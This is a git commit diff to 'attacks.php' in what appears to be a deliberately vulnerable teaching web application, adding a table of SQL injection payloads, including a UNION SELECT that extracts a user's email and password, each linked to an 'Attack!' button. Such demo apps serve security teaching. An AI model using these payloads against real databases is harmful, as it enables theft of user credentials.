23b1cb98521157461a12c2450bc812a8fb5635bd
Richard Dvorsky <generator@mydevelops.com>
2016-11-20 16:47:59 +0100

    added new attacks

--- vulnerable_web_application/attacks.php
+++ vulnerable_web_application/attacks.php
@@ -8,11 +8,19 @@ $search = $_GET['keyword'];
 
 $products[0] = array(
     "name" => "SQL Injection",
-    "description" => "Steel show all fields of listing",
-    "value" => "asdfs",
-    "attack" => "sdas"
+    "description" => "Show value of item 2 instead of nothing",
+    "value" => "0' OR id=2 --",
+    "attack" => "product.php?id=0'%20OR%20id=2--"
 ); 
 
+$products[1] = array(
+    "name" => "SQL Injection",
+    "description" => "Show email and password for a user with id 1",
+    "value" => "0' UNION SELECT 'bla', email as name, pw as description, 'bla', 'bla','bla' FROM users WHERE id=1 --",
+    "attack" => "product.php?id=0'%20UNION%20SELECT%20'bla',%20email%20as%20name,%20pw%20as%20description,%20'bla',%20'bla','bla'%20FROM%20users%20WHERE%20id=1%20%20--"
+); 
+
+ 
 
 ?>
 
@@ -39,7 +47,7 @@ $products[0] = array(
                                 <td><?php echo $product['name']; ?></td>
                                 <td><?php echo $product['description']; ?></td>
                                 <td><?php echo $product['value'];?></td>
-                                <td><a class="waves-effect waves-light btn btn-small red darken-2" href="<?=$product['value']?>">Attack!</a</td>
+                                <td><a class="waves-effect waves-light btn btn-small red darken-2" href="<?=$product['attack']?>" rel="_target">Attack!</a</td>
                             </tr>
                             <?php endforeach; ?>
                         </tbody>
